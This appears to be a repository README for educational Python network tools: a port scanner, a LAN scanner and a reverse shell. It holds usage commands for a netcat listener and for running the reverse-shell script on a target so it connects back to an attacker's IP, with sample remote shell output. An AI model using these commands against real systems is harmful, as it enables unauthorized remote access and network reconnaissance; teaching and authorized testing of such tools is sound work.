# python-network-tools
Welcome to this repository! 
Here you can find simple network tools written **without any external libraries.**

These tools are designed to be lightweight and serve as practical examples for ethical hacking or educational purposes. 

---

## **Programs Included**

1. **Port Scanner**  
   A straightforward port scanner capable of identifying open ports on a target machine. It's implemented entirely without the use of external libraries, making it portable and easy to understand for beginners.

2. **Reverse Shell**  
   A minimalistic reverse shell implementation, also built without external dependencies. It can be used to simulate remote access in controlled environments or as part of ethical hacking exercises.

3. **LAN Scanner**  
   A tool designed to scan the local area network (LAN) and identify active devices. This script detects devices connected to the same subnet and can provide insights into their IP addresses and open ports.

---

## **Key Features**

- **No external libraries required :** this is the most important strong point of this little project.
- Lightweight and easy to understand.
- Useful for **educational purposes** and for learning the basics of networking, device detection, and hacking.
- Includes tools for scanning both external networks and local area networks.

---

## **Important Disclaimer**

These tools are developed for **educational purposes only**. Unauthorized use on systems that you do not own or do not have explicit permission to test is illegal.  
The creators of this repository do not take responsibility for any misuse of the tools. Always ensure that you are working in a legal and ethical manner when performing testing or demonstrations.

---

#### **Requirements**
- Python 3.8 or more


## **How to Use**

### LAN Scanner
The LAN Scanner is a script designed to identify devices on the local network. 
It works by searching for active devices within the connected network's IP range and provides
details such as IP addresses and open ports.

#### **Features**

- Scan any local subnet for active devices.
- Displays device IP addresses and their open ports.
- Built without external libraries, ensuring portability.

#### **Limitations**

- Limited to devices within the same subnet.
- May require administrative privileges depending on the network setup.
- The scanning process may vary in accuracy based on network configuration.

#### **Use Cases**

- Identify devices connected to your network for monitoring purposes.
- Useful for network troubleshooting.
- Learn more about connected LAN devices in a safe and controlled manner.

```bash
python lan-scanner.py 192.168.1.0/24
```
Scan the local area network (LAN) to identify devices and services running on it.

---
### Port Scanner
The Port Scanner is a simple program written in Python that scans a target machine to identify open ports. Without relying on external libraries, this tool provides a basic understanding of how port scanning works at a low level. It can be used for network diagnostics, ethical hacking (within authorized environments), or educational purposes to learn about TCP/UDP connections.
#### **How It Works**
1. The scanner prompts the user to input:
    - The target IP address or hostname.
    - The range of ports to scan (e.g., `1-1024`).

2. For each port in the range, the program attempts to establish a connection (typically TCP-based).
3. If the connection is successful, it confirms the port is **open**. Otherwise, the port is considered **closed** or **filtered**.
4. The results are displayed in real-time during the scan or summarized at the end.

Since the scanner is written without external libraries, it uses:
- Python's built-in `socket` module for creating and managing network sockets.
- Loops and sequential scanning (no multi-threading or advanced optimizations).

#### **How to Use**
1. Open a terminal in the folder where the `port-scanner.py` is located.
2. **Run the script** using Python:

```bash
python port-scanner.py
```
Follow the instructions on the CLI (command line interface): the scanner works in interactive mode.
- Scans specified ranges of ports on the target machine.
- Provides real-time or end-of-scan feedback on open ports.
- Lightweight, using only Python's built-in modules (no dependencies like `nmap` or `scapy`).
- Easy-to-understand logic suitable for beginners learning networking concepts.

#### **Limitations**
- **Single-threaded**: The scanner processes one port at a time, which may be slower compared to multi-threaded or asynchronous scanners.
- **TCP-Based**: By default, it only scans for open TCP ports. UDP scanning is much more complex and is not implemented.
- **Platform-Specific Adjustments**: Hostname resolution may vary depending on the OS. Ensure you provide a valid IP address or resolvable hostname.

#### **Use Cases**
1. **Network Diagnostics**: Identify open services running on a target machine to debug or optimize network configurations.
2. **Educational Purposes**: Understand how TCP connections are established and learn about port scanning techniques.
3. **Ethical Hacking**: Simulate penetration testing to find vulnerabilities on systems where you have explicit permission.
---



### Reverse Shell
R.S.O.T. (Reverse-Shell-On-Target) is a lightweight Python implementation of a reverse shell, designed without external library dependencies. It allows a target machine to initiate a connection back to an attacker's (controller's) machine, granting the attacker remote command-line access to the target. This reverse connection bypasses certain firewall restrictions by exploiting open outbound ports on the target.
This tool is useful for educational purposes, demonstrations, or ethical hacking (in authorized environments).
#### **How It Works**
1. The attacker sets up a **listener** (e.g., using `nc` - Netcat) on their machine.
2. Then, the target machine runs the reverse shell script (`reverse-shell-on-target.py`) with the attacker's IP address and listening port as parameters.
3. The reverse shell opens a network connection from the target machine (client) to the attacker's machine (server).
4. Once connected, the attacker gains remote access to the target's command-line interface, executing commands on the target system from their listener.

#### **How to Use**
1. **On the attacker's machine**: Set up a listener using a tool like `nc` (Netcat) on the specified port. For example:

**Bind the reverse shell server on your machine:**
```bash
nc -lnvp <listener_port>
```
Replace `<listener_port>` with the port you want to listen on (e.g., `1234`).

2. **On the target machine**: Execute the reverse shell script with the attacker's IP and listening port as arguments:
```bash
python reverse-shell-on-target.py <your_machine_ip> <listener_port>
```

Replace:
- `<attacker_ip>` with the attacker's IP address or hostname.
- `<listener_port>` with the port on which the attacker's listener is running.

3. **Gain remote shell access**: Once executed on the target, the script will connect back to the attacker's machine, giving them a remote shell for executing commands on the target system.

#### **Example**
If the attacker's IP is `192.168.1.10` and they want to listen on port `1234`:
1. The attacker sets up the listener:

```bash
 nc -lnvp 1234
```
2. The target runs the reverse shell script:

```bash
python reverse-shell-on-target.py 192.168.1.10 1234
```

3. On the attacker's listener, a connection is established, granting a shell interface:

```bash
Listening on [0.0.0.0] (family 0, port 1234)
   Connection received from [192.168.1.5] port 1234
   whoami
   target-user
   pwd
   /home/target-user
```
---

#### **Legal Disclaimer**
Unauthorized scanning of devices without proper permissions violates most laws and network policies. Use with caution and ensure you have explicit consent before scanning any network or devices. This script is designed for educational purposes and use within controlled environments only.

#### **Future Improvements**

- Add functionality to detect device types and hostnames.
- Support for multiple network ranges.
- Implement multi-threaded scanning for faster results.

## **Use Cases**

- **Educational Purposes**: Learn the basics of networking, open ports, and remote shells.
- **Ethical Hacking**: Test your own systems or systems where you have **explicit permission** to perform penetration testing.
- **Codeless Understanding**: Study the fundamental implementation of some common hacking techniques without relying on bulky dependencies.

---

## **Legal Warning**

Unauthorized scanning of ports or connecting to systems without permission is considered illegal in most jurisdictions. Use these tools responsibly, and **always ensure you have explicit permission** before testing any system. These tools are meant for educational purposes and ethical hacking within controlled environments.

---

## **Future Improvements**

- Adding more advanced scanning techniques (e.g., multi-threading).
- Improving reverse shell security features.
- Introducing more detailed logging functionality.
- Enhancing LAN Scanner capabilities to include device fingerprinting.

